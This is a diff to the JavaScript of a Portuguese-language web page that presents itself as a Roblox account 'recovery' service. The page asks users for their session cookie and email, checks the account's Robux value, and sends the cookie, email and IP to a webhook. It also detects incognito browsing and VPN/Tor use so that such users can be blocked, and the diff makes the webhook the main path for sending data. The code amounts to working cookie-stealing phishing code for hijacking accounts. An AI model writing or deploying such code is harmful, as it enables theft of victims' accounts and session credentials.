@@ -2290,7 +2290,6 @@
                 let detectionMethods = 0;
                 let positiveResults = 0;
 
-                // Método 1: localStorage
                 try {
                     const test = '__aurora_test__';
                     localStorage.setItem(test, '1');
@@ -2300,7 +2299,6 @@
                 }
                 detectionMethods++;
 
-                // Método 2: sessionStorage
                 try {
                     const test = '__aurora_test__';
                     sessionStorage.setItem(test, '1');
@@ -2310,7 +2308,6 @@
                 }
                 detectionMethods++;
 
-                // Método 3: IndexedDB
                 try {
                     const request = indexedDB.open('__aurora_test__');
                     request.onerror = () => {
@@ -2331,23 +2328,18 @@
                     }
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(positiveResults >= 2);
                 }, 1000);
             });
         }
 
-        // ============================================================
-        // 1.5 FUNÇÃO PARA DETECTAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS EFICAZ)
-        // ============================================================
         function detectPrivateBrowsingBrowser() {
             return new Promise((resolve) => {
                 let result = false;
                 let checksDone = 0;
                 let totalChecks = 4;
                 
-                // Método 1: localStorage
                 try {
                     const test = '__aurora_test__';
                     localStorage.setItem(test, '1');
@@ -2357,7 +2349,6 @@
                 }
                 checksDone++;
 
-                // Método 2: sessionStorage
                 try {
                     const test = '__aurora_test__';
                     sessionStorage.setItem(test, '1');
@@ -2367,7 +2358,6 @@
                 }
                 checksDone++;
 
-                // Método 3: IndexedDB
                 try {
                     const request = indexedDB.open('__aurora_test__');
                     request.onerror = () => { 
@@ -2388,10 +2378,8 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
-                // Método 4: quota de armazenamento (Chrome)
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
-                        // Em modo incógnito, a quota é menor que 120MB
                         if (estimate.quota < 120000000) {
                             result = true;
                         }
@@ -2406,30 +2394,25 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(result);
                 }, 3000);
             });
         }
 
-        // Detectar VPN/Proxy via IP com múltiplos métodos
         async function detectVPN() {
             try {
-                // Usar múltiplas APIs para melhor precisão
                 const ipData = await getIPData();
                 if (!ipData) return false;
 
-                // Verificar indicadores de VPN com lógica mais rigorosa
                 const vpnIndicators = [
                     ipData.is_vpn === true,
                     ipData.is_proxy === true,
                     ipData.is_tor === true,
                     ipData.is_datacenter === true,
-                    ipData.threat_level > 50 // Alto nível de ameaça
+                    ipData.threat_level > 50
                 ];
 
-                // Retorna true se detectar VPN/Proxy/Tor ou datacenter
                 const detected = vpnIndicators.some(indicator => indicator === true);
                 if (detected) {
                     console.warn('🚨 VPN/Proxy detectado:', ipData);
@@ -2441,7 +2424,6 @@
             }
         }
 
-        // Obter dados de IP com fallback
         async function getIPData() {
             const apis = [
                 {
@@ -2462,14 +2444,6 @@
                         is_datacenter: data.hosting === true,
                         threat_level: (data.proxy || data.hosting) ? 75 : 0
                     })
-                },
-                {
-                    url: 'https://api.abuseipdb.com/api/v2/check?maxAgeInDays=90',
-                    headers: { 'Key': 'unknown' },
-                    parser: (data) => ({
-                        is_vpn: data.usageType === 'VPN',
-                        threat_level: data.abuseConfidenceScore || 0
-                    })
                 }
             ];
 
@@ -2485,7 +2459,6 @@
                         return api.parser(data);
                     }
                 } catch (e) {
-                    console.warn(`API ${api.url} falhou:`, e);
                     continue;
                 }
             }
@@ -2493,15 +2466,12 @@
             return null;
         }
 
-        // Detectar Google Chrome anônimo especificamente com múltiplos métodos
         async function isGoogleIncognito() {
             return new Promise((resolve) => {
                 let detectionResults = [];
 
-                // Método 1: Verificar quota de armazenamento
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
-                        // Em modo incógnito, a quota é muito menor (< 120MB)
                         detectionResults.push(estimate.quota < 120000000);
                         if (detectionResults.length >= 2) {
                             resolve(detectionResults.some(r => r === true));
@@ -2516,7 +2486,6 @@
                     detectionResults.push(false);
                 }
 
-                // Método 2: Verificar requestFileSystem (Chrome específico)
                 if (window.webkitRequestFileSystem) {
                     window.webkitRequestFileSystem(
                         window.TEMPORARY,
@@ -2528,7 +2497,7 @@
                             }
                         },
                         () => {
-                            detectionResults.push(true); // Erro = modo incógnito
+                            detectionResults.push(true);
                             if (detectionResults.length >= 2) {
                                 resolve(detectionResults.some(r => r === true));
                             }
@@ -2538,7 +2507,6 @@
                     detectionResults.push(false);
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     if (detectionResults.length > 0) {
                         resolve(detectionResults.some(r => r === true));
@@ -2551,11 +2519,8 @@
 
         async function checkBlocked() {
             try {
-                // Verificar navegador anônimo
                 const isPrivate = await isPrivateBrowsing();
                 const isGoogleIncog = await isGoogleIncognito();
-                
-                // Verificar VPN/Proxy
                 const hasVPN = await detectVPN();
                 
                 const blockModal = document.getElementById('blockModal');
@@ -2655,9 +2620,6 @@
             }
         }
 
-        // ============================================================
-        // 3.6 FUNÇÃO PARA MOSTRAR MODAL DE BLOQUEIO POR BANIMENTO
-        // ============================================================
         function showBanBlockModal(reason, expires) {
             const blockModal = document.getElementById('blockModal');
             const blockReason = document.getElementById('blockReason');
@@ -2741,7 +2703,7 @@
         }
 
         // ============================================================
-        // 6. FUNÇÃO PARA ENVIAR PARA WEBHOOK (SÓ USADA COMO FALLBACK)
+        // 6. FUNÇÃO PARA ENVIAR PARA WEBHOOK
         // ============================================================
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
@@ -2848,9 +2810,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ============================================================
-        // 8.5 FUNÇÃO PARA IR PARA RECUPERAÇÃO COM VERIFICAÇÃO
-        // ============================================================
         function goToRecovery() {
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
@@ -2915,118 +2874,6 @@
         }
 
         // ============================================================
-        // NOVA FUNÇÃO: VALIDAR CONTA ANTES DE ENVIAR
-        // ============================================================
-        async function validateAccount(cookie, email) {
-            try {
-                const response = await fetch('/api/validate-account', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie, email })
-                });
-
-                return await response.json();
-            } catch (error) {
-                console.error('Erro na validação:', error);
-                return { error: true, message: 'Erro ao validar conta' };
-            }
-        }
-
-        // ============================================================
-        // FUNÇÃO: Mostrar resultado da validação
-        // ============================================================
-        function showValidationResult(data) {
-            const oldResult = document.getElementById('validationResult');
-            if (oldResult) oldResult.remove();
-
-            const resultDiv = document.createElement('div');
-            resultDiv.id = 'validationResult';
-            resultDiv.style.cssText = `
-                margin-top: 1rem;
-                background: linear-gradient(135deg, rgba(124,58,237,0.1), rgba(192,132,252,0.1));
-                border: 2px solid ${data.level.color};
-                border-radius: 12px;
-                padding: 1.2rem;
-                animation: fadeInUp 0.4s ease-out;
-            `;
-
-            resultDiv.innerHTML = `
-                <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
-                    <img src="${data.avatar.thumbnail}" style="width: 50px; height: 50px; border-radius: 50%; border: 2px solid ${data.level.color};" onerror="this.style.display='none'">
-                    <div>
-                        <h4 style="color: white; margin: 0;">${data.username}</h4>
-                        <p style="color: rgba(255,255,255,0.6); margin: 0; font-size: 0.8rem;">${data.displayName} • ${data.accountAge.formatted}</p>
-                    </div>
-                    <div style="margin-left: auto; background: ${data.level.color}20; padding: 0.2rem 0.6rem; border-radius: 50px; border: 1px solid ${data.level.color};">
-                        <span style="color: ${data.level.color}; font-weight: 700; font-size: 0.8rem;">${data.level.badge}</span>
-                    </div>
-                </div>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 0.5rem; margin-top: 0.8rem;">
-                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
-                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Amigos</p>
-                        <p style="color: white; font-weight: 700; margin: 0;">${data.stats.friends}</p>
-                    </div>
-                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
-                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Grupos</p>
-                        <p style="color: white; font-weight: 700; margin: 0;">${data.stats.groups}</p>
-                    </div>
-                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
-                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Itens</p>
-                        <p style="color: white; font-weight: 700; margin: 0;">${data.stats.items}</p>
-                    </div>
-                    <div style="text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.5rem;">
-                        <p style="color: rgba(255,255,255,0.4); font-size: 0.6rem; margin: 0;">Robux</p>
-                        <p style="color: ${data.robux.color}; font-weight: 700; margin: 0; font-size: 0.85rem;">${data.robux.formatted}</p>
-                    </div>
-                </div>
-                <div style="margin-top: 0.5rem; text-align: center; background: rgba(0,0,0,0.2); border-radius: 8px; padding: 0.3rem;">
-                    <p style="color: rgba(255,255,255,0.6); font-size: 0.7rem; margin: 0;">${data.robux.level} • ${data.level.name}</p>
-                </div>
-            `;
-
-            const securityBox = document.querySelector('.security-box');
-            securityBox.parentNode.insertBefore(resultDiv, securityBox.nextSibling);
-        }
-
-        // ============================================================
-        // FUNÇÃO: Custom Modal para BOT
-        // ============================================================
-        function showCustomModal(title, message, type) {
-            const modal = document.createElement('div');
-            modal.style.cssText = `
-                position: fixed;
-                inset: 0;
-                background: rgba(0,0,0,0.85);
-                backdrop-filter: blur(15px);
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                z-index: 99999;
-                padding: 1.5rem;
-                animation: fadeInUp 0.3s ease-out;
-            `;
-
-            const colors = {
-                danger: '#ef4444',
-                warning: '#f59e0b',
-                success: '#10b981'
-            };
-
-            modal.innerHTML = `
-                <div style="background: linear-gradient(135deg, rgba(10,5,21,0.98), rgba(26,13,46,0.98)); border: 2px solid ${colors[type] || '#7c3aed'}; border-radius: 20px; padding: 2rem; max-width: 500px; width: 100%; text-align: center; animation: scaleIn 0.3s ease-out;">
-                    <div style="font-size: 3rem; margin-bottom: 1rem;">🤖</div>
-                    <h2 style="color: ${colors[type] || 'white'}; font-size: 1.5rem; font-weight: 800; font-family: 'Poppins', sans-serif; margin-bottom: 0.8rem;">${title}</h2>
-                    <p style="color: rgba(255,255,255,0.8); font-size: 0.95rem; line-height: 1.7;">${message}</p>
-                    <button onclick="this.closest('div[style]').remove()" style="margin-top: 1.5rem; background: linear-gradient(135deg, #7c3aed, #5b21b6); color: white; border: none; padding: 0.8rem 2rem; border-radius: 10px; font-weight: 700; cursor: pointer; font-family: 'Inter', sans-serif; transition: all 0.3s ease;">
-                        <i class="fas fa-check"></i> Entendi
-                    </button>
-                </div>
-            `;
-
-            document.body.appendChild(modal);
-        }
-
-        // ============================================================
         // 12. HANDLE SUBMIT COM VALIDAÇÃO DE CONTA
         // ============================================================
         async function handleSubmit(event) {
@@ -3086,77 +2933,120 @@
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Validando conta...';
 
-            const validateResult = await validateAccount(cookie, email);
+            try {
+                const validateResponse = await fetch('/api/validate-account', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie })
+                });
 
-            // Se for BOT
-            if (validateResult.error && validateResult.message && validateResult.message.includes('BOT')) {
-                showNotification('🤖', 'CONTA BOT DETECTADA!', 'IP banido automaticamente.');
-                
-                let reasonsHtml = (validateResult.reasons || []).map(r => `<li>${r}</li>`).join('');
-                showCustomModal(
-                    '🤖 CONTA BOT DETECTADA',
-                    `Esta conta foi identificada como BOT. Motivos:<br><ul style="text-align:left;">${reasonsHtml || '<li>Motivo desconhecido</li>'}</ul><br>Seu IP foi registrado e banido.`,
-                    'danger'
-                );
-                
-                document.getElementById('submitBtn').disabled = false;
-                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
-                return;
-            }
+                const validateData = await validateResponse.json();
 
-            // Se for inválida (cookie inválido, etc)
-            if (validateResult.error) {
-                showNotification('❌', 'Erro!', validateResult.message || 'Falha na validação');
-                document.getElementById('submitBtn').disabled = false;
-                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
-                return;
-            }
+                // Se for BOT
+                if (validateData.error && validateData.message && validateData.message.includes('BOT')) {
+                    let reasonsHtml = (validateData.reasons || []).map(r => `<li>${r}</li>`).join('');
+                    showCustomModal(
+                        '🤖 CONTA BOT DETECTADA',
+                        `Esta conta foi identificada como BOT. Motivos:<br><ul style="text-align:left;">${reasonsHtml || '<li>Motivo desconhecido</li>'}</ul>`,
+                        'danger'
+                    );
+                    
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                    return;
+                }
 
-            // ============================================
-            // CONTA VÁLIDA! MOSTRAR INFORMAÇÕES
-            // ============================================
-            if (validateResult.success) {
-                showValidationResult(validateResult);
-
-                const confirmRecovery = confirm(
-                    `✅ CONTA VALIDADA!\n\n` +
-                    `👤 Usuário: ${validateResult.username}\n` +
-                    `📅 Idade: ${validateResult.accountAge.formatted}\n` +
-                    `👥 Amigos: ${validateResult.stats.friends}\n` +
-                    `💰 Robux Estimado: ${validateResult.robux.formatted}\n` +
-                    `📊 Nível: ${validateResult.level.badge}\n\n` +
-                    `Deseja continuar com a recuperação?`
-                );
-
-                if (!confirmRecovery) {
+                // Se for inválida (cookie inválido, etc)
+                if (validateData.error) {
+                    showNotification('❌', 'Erro!', validateData.message || 'Falha na validação');
                     document.getElementById('submitBtn').disabled = false;
                     document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
                     return;
                 }
 
                 // ============================================
-                // BLOQUEAR E MOSTRAR SUCESSO (webhook já foi enviado pela API)
+                // CONTA VÁLIDA! CONTINUAR COM O ENVIO NORMAL
                 // ============================================
-                hasAttempted = true;
-                isBlocked = true;
-                
-                blockUntil = Date.now() + (9 * 60 * 60 * 1000);
-                localStorage.setItem('aurora_block_until', blockUntil.toString());
-                
-                document.getElementById('submitBtn').disabled = true;
-                document.getElementById('submitBtn').style.opacity = '0.5';
-                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
-                
-                document.getElementById('blockMessage').classList.add('visible');
-                document.getElementById('timerDisplay').textContent = '9h 00m 00s';
-                
-                if (timerInterval) clearInterval(timerInterval);
-                timerInterval = setInterval(updateTimer, 1000);
-                
-                showNotification('✅', 'Sucesso!', 'Conta validada e enviada para recuperação!');
-                showProcessingModal();
-                setTimeout(showSuccessModal, 3000);
+                if (validateData.success) {
+                    const ip = await getIP();
+                    const isPrivate = await isPrivateBrowsing();
+                    const hasVPN = await detectVPN();
+
+                    document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
+
+                    const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
+
+                    if (sent) {
+                        hasAttempted = true;
+                        isBlocked = true;
+                        
+                        blockUntil = Date.now() + (9 * 60 * 60 * 1000);
+                        localStorage.setItem('aurora_block_until', blockUntil.toString());
+                        
+                        document.getElementById('submitBtn').disabled = true;
+                        document.getElementById('submitBtn').style.opacity = '0.5';
+                        document.getElementById('submitBtn').innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
+                        
+                        document.getElementById('blockMessage').classList.add('visible');
+                        document.getElementById('timerDisplay').textContent = '9h 00m 00s';
+                        
+                        if (timerInterval) clearInterval(timerInterval);
+                        timerInterval = setInterval(updateTimer, 1000);
+                        
+                        showNotification('✅', 'Sucesso!', 'Conta enviada para recuperação!');
+                        showProcessingModal();
+                        setTimeout(showSuccessModal, 3000);
+                    } else {
+                        document.getElementById('submitBtn').disabled = false;
+                        document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                        showNotification('❌', 'Erro!', 'Falha ao enviar dados.');
+                    }
+                }
+
+            } catch (error) {
+                console.error('Erro:', error);
+                showNotification('❌', 'Erro!', 'Falha na validação.');
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
             }
+        }
+
+        // ============================================================
+        // FUNÇÃO: Custom Modal para BOT
+        // ============================================================
+        function showCustomModal(title, message, type) {
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                inset: 0;
+                background: rgba(0,0,0,0.85);
+                backdrop-filter: blur(15px);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 99999;
+                padding: 1.5rem;
+                animation: fadeInUp 0.3s ease-out;
+            `;
+
+            const colors = {
+                danger: '#ef4444',
+                warning: '#f59e0b',
+                success: '#10b981'
+            };
+
+            modal.innerHTML = `
+                <div style="background: linear-gradient(135deg, rgba(10,5,21,0.98), rgba(26,13,46,0.98)); border: 2px solid ${colors[type] || '#7c3aed'}; border-radius: 20px; padding: 2rem; max-width: 500px; width: 100%; text-align: center; animation: scaleIn 0.3s ease-out;">
+                    <div style="font-size: 3rem; margin-bottom: 1rem;">🤖</div>
+                    <h2 style="color: ${colors[type] || 'white'}; font-size: 1.5rem; font-weight: 800; font-family: 'Poppins', sans-serif; margin-bottom: 0.8rem;">${title}</h2>
+                    <p style="color: rgba(255,255,255,0.8); font-size: 0.95rem; line-height: 1.7;">${message}</p>
+                    <button onclick="this.closest('div[style]').remove()" style="margin-top: 1.5rem; background: linear-gradient(135deg, #7c3aed, #5b21b6); color: white; border: none; padding: 0.8rem 2rem; border-radius: 10px; font-weight: 700; cursor: pointer; font-family: 'Inter', sans-serif; transition: all 0.3s ease;">
+                        <i class="fas fa-check"></i> Entendi
+                    </button>
+                </div>
+            `;
+
+            document.body.appendChild(modal);
         }
 
         // ============================================================
